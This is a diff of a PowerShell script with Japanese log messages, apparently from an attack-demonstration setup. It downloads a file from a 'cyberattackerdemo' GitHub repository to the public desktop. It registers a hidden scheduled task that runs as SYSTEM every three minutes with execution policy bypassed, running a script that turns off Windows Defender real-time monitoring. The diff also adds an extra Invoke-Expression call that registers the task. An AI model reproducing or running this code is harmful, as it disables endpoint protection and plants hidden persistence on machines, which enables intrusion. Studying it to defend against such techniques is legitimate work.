@@ -247,7 +247,7 @@ try {
 try {
     Log "commands_note.txt のダウンロード開始"
 
-    $desktopPath = [Environment]::GetFolderPath("Desktop")
+    $desktopPath = $desktopPath = "$env:PUBLIC\Desktop"
     $downloadUrl = "https://raw.githubusercontent.com/cyberattackerdemo/public/main/commands_note.txt"
     $outputFile = Join-Path $desktopPath "commands_note.txt"
 
@@ -269,7 +269,11 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 $taskName = "DisableDefenderEvery3Min"
 $action = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$defenderScriptPath`""
 $trigger = "/SC MINUTE /MO 3"
-$registerCmd = "schtasks /Create /TN `"$taskName`" /TR `"$action`" /RU SYSTEM $trigger /F"
+$registerCmd = @"
+schtasks /Create /TN "$taskName" /TR "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$defenderScriptPath`"" /RU SYSTEM /SC MINUTE /MO 3 /F
+"@
+Invoke-Expression $registerCmd
+
 
 try {
     Invoke-Expression $registerCmd
